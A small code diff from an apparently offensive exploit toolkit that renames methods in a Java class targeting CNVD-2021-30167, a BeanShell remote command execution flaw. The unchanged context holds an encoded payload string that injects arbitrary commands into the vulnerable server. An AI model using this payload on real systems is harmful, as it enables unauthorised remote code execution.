@@ -3,7 +3,6 @@ package fun.fireline.exp.cms.nc;
 import fun.fireline.core.ExploitInterface;
 import fun.fireline.tools.HttpTool;
 
-import java.util.HashMap;
 import java.util.UUID;
 
 /**
@@ -21,7 +20,7 @@ public class CNVD_2021_30167 implements ExploitInterface {
     private static final String PAYLOAD = "bsh.script=exec%28%22%s%22%29%3B%0D%0A";
 
     @Override
-    public boolean checkVUL(String url) {
+    public boolean checkVul(String url) {
 
         String uuid =  UUID.randomUUID().toString();
 
@@ -42,7 +41,7 @@ public class CNVD_2021_30167 implements ExploitInterface {
     }
 
     @Override
-    public String exeCMD(String cmd, String encoding) {
+    public String exeCmd(String cmd, String encoding) {
         return null;
     }
 
